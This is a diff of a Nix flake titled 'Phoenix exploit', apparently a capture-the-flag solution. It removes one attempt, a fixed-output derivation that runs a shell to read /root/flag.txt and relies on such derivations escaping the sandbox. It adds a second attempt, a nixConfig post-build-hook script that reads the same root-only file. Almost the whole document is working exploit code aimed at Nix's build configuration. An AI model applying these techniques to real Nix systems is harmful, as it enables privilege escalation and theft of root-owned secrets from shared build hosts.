@@ -1,27 +1,26 @@
 {
-  description = "Phoenix";
+  description = "Phoenix exploit";
 
-  outputs = { self }: {
-    packages.x86_64-linux.default =
-      builtins.derivation {
-        name = "flag";
-        system = "x86_64-linux";
+  inputs.nixpkgs.url = "github:NixOS/nixpkgs/release-25.05";
 
-        # Fixed-output derivations are allowed outside the normal sandbox.
-        outputHashMode = "flat";
-        outputHashAlgo = "sha256";
-        outputHash = "sha256-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=";
+  outputs = { nixpkgs, ... }:
+    let
+      system = "x86_64-linux";
+      pkgs = import nixpkgs { inherit system; };
 
-        builder = "/bin/sh";
-
-        args = [
-          "-c"
-          ''
-            FLAG="$(cat /root/flag.txt)"
-            echo "PHOENIX_FLAG=$FLAG" >&2
-            printf '%s' "$FLAG" > "$out"
-          ''
-        ];
+      hook = pkgs.writeShellScript "phoenix-hook" ''
+        printf 'PHOENIX_FLAG='
+        IFS= read -r FLAG < /root/flag.txt
+        printf '%s\n' "$FLAG"
+      '';
+    in {
+      nixConfig = {
+        post-build-hook = "${hook}";
       };
-  };
+
+      packages.${system}.default =
+        pkgs.runCommand "phoenix-trigger" {} ''
+          touch $out
+        '';
+    };
 }
